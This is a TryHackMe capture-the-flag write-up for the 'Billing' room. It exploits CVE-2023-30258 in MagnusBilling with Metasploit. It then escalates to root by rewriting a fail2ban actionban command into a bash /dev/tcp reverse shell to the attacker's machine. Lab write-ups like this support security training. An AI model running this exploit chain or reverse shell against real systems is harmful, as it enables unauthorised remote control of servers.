# Billing — TryHackMe Writeup

## Target

Target IP: 10.114.147.183

## 1. Enumeration

I started with a basic Nmap scan to identify the open ports and running services:

nmap -sC -sV 10.114.147.183

The scan revealed a web service running on the target. After visiting the website, I identified the application as MagnusBilling.

A quick search for known vulnerabilities affecting MagnusBilling revealed CVE-2023-30258, an unauthenticated command injection vulnerability that can be used to achieve remote code execution.

## 2. Initial Access

Since Metasploit already has a module for this vulnerability, I used it to obtain a shell on the target.

Start Metasploit:

msfconsole

Search for the MagnusBilling exploit:

search magnusbilling

Then select the module:

use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258

Set the required options:

set RHOSTS 10.114.147.183
set LHOST 192.168.142.124
set LPORT 4444

Run the exploit:

run

The exploit successfully opened a Meterpreter session.

I checked the current user:

getuid

After dropping into a normal shell:

shell

I confirmed that I was running as:

asterisk

At this point, we have initial access, but we still need to escalate our privileges.

## 3. Privilege Escalation

The first thing I checked was the sudo configuration:

sudo -l

The important part of the output was:

(ALL) NOPASSWD: /usr/bin/fail2ban-client

This means that the asterisk user can execute fail2ban-client as root without providing a password.

I then checked the available Fail2Ban jails:

sudo /usr/bin/fail2ban-client status

One of the interesting jails was:

mbilling_login

I checked which action was configured for this jail:

sudo /usr/bin/fail2ban-client get mbilling_login actions

The configured action was:

iptables-allports

Next, I checked what command is executed when an IP address is banned:

sudo /usr/bin/fail2ban-client get mbilling_login action iptables-allports actionban

The important part here is the actionban command.

Since fail2ban-client can be executed as root, we can modify the actionban command and make Fail2Ban execute our own command with root privileges.

## 4. Getting a Root Shell

On my Kali machine, I started a Netcat listener:

nc -lvnp 4445

I then replaced the actionban command with a reverse shell:

sudo /usr/bin/fail2ban-client set mbilling_login action iptables-allports actionban "bash -c 'bash -i >& /dev/tcp/192.168.142.124/4445 0>&1'"

Finally, I triggered the jail by banning a new IP address:

sudo /usr/bin/fail2ban-client set mbilling_login banip 123.123.123.124

The actionban command was executed by Fail2Ban, and the reverse shell connected back to my Kali machine.

I checked my privileges:

whoami

The result:

root

We now have a root shell on the target.

## 5. Flags

With root access, I searched for the user flag:

find / -name user.txt 2>/dev/null

I also searched for the root flag:

find / -name root.txt 2>/dev/null

The flags can then be read with cat.

## Attack Path

Nmap enumeration
↓
MagnusBilling identified
↓
CVE-2023-30258
↓
Unauthenticated RCE
↓
Meterpreter session
↓
asterisk user
↓
sudo -l
↓
NOPASSWD fail2ban-client
↓
mbilling_login jail
↓
Modify actionban
↓
Trigger banip
↓
Fail2Ban executes reverse shell
↓
Root access
↓
Flags

## Conclusion

The initial foothold was obtained by exploiting CVE-2023-30258 in MagnusBilling.

For privilege escalation, the asterisk user was allowed to run fail2ban-client as root without a password. By abusing the actionban command of the mbilling_login jail, I was able to execute a reverse shell with root privileges and gain full control of the machine.
